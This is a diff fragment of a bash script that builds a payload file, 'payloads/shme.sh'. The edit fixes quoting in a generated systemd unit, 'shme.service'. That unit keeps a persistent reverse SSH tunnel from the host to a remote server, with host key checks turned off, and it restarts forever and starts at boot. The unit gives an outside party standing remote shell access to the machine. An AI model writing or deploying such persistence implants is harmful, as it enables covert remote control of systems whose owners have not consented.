@@ -93,29 +93,29 @@ printf "#!/bin/bash
 
     # drop systemd file
     touch /etc/systemd/system/shme.service
-    sysd=\"[Unit]
-        Description=Remote SSH tunnel to $SRVHOST as user $rmtUser
-        Wants=network-online.target
-        After=network-online.target
-        StartLimitIntervalSec=0
+    printf \"[Unit]
+            Description=Remote SSH tunnel to $SRVHOST as user $rmtUser
+            Wants=network-online.target
+            After=network-online.target
+            StartLimitIntervalSec=0
 
-        [Service]
-        Type=simple
-        ExecStart=/usr/bin/ssh -qNn \
-            -o ServerAliveInterval=30 \
-            -o ServerAliveCountMax=3 \
-            -o ExitOnForwardFailure=yes \
-            -o StrictHostKeyChecking=no \
-            -o UserKnownHostsFile=/dev/null \
-            -i ~/.ssh/$rmtUser \
-            -R $RMTFWD:localhost:22 \
-            $rmtUser@$SRVHOST -p $SRVSSH
-        Restart=always
-        RestartSec=60
+            [Service]
+            Type=simple
+            ExecStart=/usr/bin/ssh -qNn \\
+                -o ServerAliveInterval=30 \\
+                -o ServerAliveCountMax=3 \\
+                -o ExitOnForwardFailure=yes \\
+                -o StrictHostKeyChecking=no \\
+                -o UserKnownHostsFile=/dev/null \\
+                -i ~/.ssh/$rmtUser \\
+                -R $RMTFWD:localhost:22 \\
+                $rmtUser@$SRVHOST -p $SRVSSH
+            Restart=always
+            RestartSec=60
 
-        [Install]
-        WantedBy=multi-user.target\"
-    printf \$sysd > /etc/systemd/system/shme.service
+            [Install]
+            WantedBy=multi-user.target\" > /etc/systemd/system/shme.service
+
     sudo systemctl enable --now shme.service" > payloads/shme.sh
 
 # err handling
